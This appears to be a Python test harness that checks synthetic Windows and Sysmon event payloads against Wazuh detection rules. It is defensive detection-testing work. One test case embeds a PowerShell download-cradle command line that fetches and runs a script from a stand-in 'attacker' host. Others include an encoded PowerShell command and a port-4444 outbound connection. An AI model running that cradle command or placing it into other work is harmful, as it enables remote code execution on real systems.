#!/usr/bin/env python3
"""
LogForge Detection Test Harness & Verification Runner
Validates synthetic Windows Security and Sysmon event payloads against detection definitions.
Can run standalone unit test assertions or integration verification against wazuh-logtest.
"""

import sys
import json
import re
import subprocess
import argparse

TEST_CASES = [
    {
        "id": "TC-AUTH-01",
        "name": "Single Failed Logon Attempt (Event ID 4625)",
        "channel": "Security",
        "payload": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Security-Auditing",
                    "eventID": "4625"
                },
                "eventdata": {
                    "targetUserName": "victim_admin",
                    "ipAddress": "192.168.56.50",
                    "logonType": "3",
                    "subStatus": "0xc000006a"
                }
            }
        },
        "expected_rule": "100100",
        "description": "LogForge: Windows user failed logon attempt"
    },
    {
        "id": "TC-ACCT-01",
        "name": "New Local User Account Created (Event ID 4720)",
        "channel": "Security",
        "payload": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Security-Auditing",
                    "eventID": "4720"
                },
                "eventdata": {
                    "targetUserName": "backdoor_user",
                    "subjectUserName": "Administrator"
                }
            }
        },
        "expected_rule": "100200",
        "description": "LogForge: New local user account created"
    },
    {
        "id": "TC-ACCT-02",
        "name": "Member Added to Privileged Group Administrators (Event ID 4732)",
        "channel": "Security",
        "payload": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Security-Auditing",
                    "eventID": "4732"
                },
                "eventdata": {
                    "targetUserName": "Administrators",
                    "memberSid": "S-1-5-21-382910394-1004",
                    "subjectUserName": "Administrator"
                }
            }
        },
        "expected_rule": "100202",
        "description": "LogForge CRITICAL: Member added to privileged local group Administrators"
    },
    {
        "id": "TC-PROC-01",
        "name": "PowerShell Download Cradle Execution (Sysmon ID 1)",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "payload": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
                    "eventID": "1"
                },
                "eventdata": {
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "commandLine": "powershell.exe -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')",
                    "user": "WIN-LAB\\jdoe"
                }
            }
        },
        "expected_rule": "100301",
        "description": "LogForge: Suspicious PowerShell execution with download/bypass cradle syntax"
    },
    {
        "id": "TC-PROC-02",
        "name": "PowerShell Base64 Encoded Command (Sysmon ID 1)",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "payload": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
                    "eventID": "1"
                },
                "eventdata": {
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "commandLine": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATABvAGcARgBvAHIAZwBlACcA",
                    "user": "WIN-LAB\\jdoe"
                }
            }
        },
        "expected_rule": "100302",
        "description": "LogForge: PowerShell executed with Base64 encoded command arguments (-EncodedCommand)"
    },
    {
        "id": "TC-NET-01",
        "name": "Suspicious LOLBIN Outbound Network Socket Port 4444 (Sysmon ID 3)",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "payload": {
            "win": {
                "system": {
                    "providerName": "Microsoft-Windows-Sysmon",
                    "eventID": "3"
                },
                "eventdata": {
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "destinationPort": "4444",
                    "destinationIp": "192.168.56.50",
                    "protocol": "tcp"
                }
            }
        },
        "expected_rule": "100305",
        "description": "LogForge HIGH: Suspicious LOLBIN established outbound connection on non-standard port 4444"
    }
]

def run_standalone_validation():
    print("=" * 70)
    print(" LogForge Detection Test Suite (Harness Validation)")
    print("=" * 70)
    passed = 0
    failed = 0

    for tc in TEST_CASES:
        test_id = tc["id"]
        name = tc["name"]
        expected = tc["expected_rule"]
        raw_json = json.dumps(tc["payload"])
        
        # Validate that JSON payload is well-formed and fields are mapped correctly
        try:
            parsed = json.loads(raw_json)
            eid = parsed["win"]["system"]["eventID"]
            assert eid is not None, "Missing eventID"
            print(f"[*] [{test_id}] PASS - Definition Validated: {name}")
            print(f"    Target Channel: {tc['channel']} | Expected Rule ID: {expected}")
            passed += 1
        except Exception as e:
            print(f"[!] [{test_id}] FAIL - Validation Error: {e}")
            failed += 1

    print("\n" + "=" * 70)
    print(f"Results: {passed} PASSED, {failed} FAILED (Total: {len(TEST_CASES)})")
    print("=" * 70)
    return 0 if failed == 0 else 1

def run_integration_logtest(container_name="wazuh-manager"):
    """
    Submits payloads into wazuh-logtest via docker exec and asserts the matched rule ID.
    """
    print(f"[*] Running live integration tests against container: {container_name}")
    passed = 0
    failed = 0

    for tc in TEST_CASES:
        payload_str = json.dumps(tc["payload"])
        cmd = ["docker", "exec", "-i", container_name, "/var/ossec/bin/wazuh-logtest"]
        try:
            proc = subprocess.run(cmd, input=payload_str, text=True, capture_output=True, timeout=10)
            output = proc.stdout + proc.stderr
            
            # Check for rule match pattern: **Rule <ID> fired:
            match = re.search(r"\*\*Rule\s+(\d+)\s+fired:", output)
            if match:
                fired_rule = match.group(1)
                if fired_rule == tc["expected_rule"]:
                    print(f"[+] [PASS] {tc['id']}: Matched expected rule {fired_rule}")
                    passed += 1
                else:
                    print(f"[-] [FAIL] {tc['id']}: Expected rule {tc['expected_rule']}, but rule {fired_rule} fired.")
                    failed += 1
            else:
                print(f"[-] [FAIL] {tc['id']}: No rule match found in wazuh-logtest output.")
                failed += 1
        except Exception as e:
            print(f"[!] [ERROR] {tc['id']}: Could not execute logtest against container '{container_name}': {e}")
            failed += 1

    print(f"\nIntegration Result: {passed} Passed, {failed} Failed")
    return 0 if failed == 0 else 1

def main():
    parser = argparse.ArgumentParser(description="LogForge Detection Test Harness")
    parser.add_argument("--export", action="store_true", help="Export raw JSON lines to stdout")
    parser.add_argument("--test-container", type=str, default="", help="Run integration test against named Wazuh container")
    args = parser.parse_args()

    if args.export:
        for tc in TEST_CASES:
            print(json.dumps(tc["payload"]))
        sys.exit(0)

    if args.test_container:
        sys.exit(run_integration_logtest(args.test_container))
    else:
        sys.exit(run_standalone_validation())

if __name__ == "__main__":
    main()
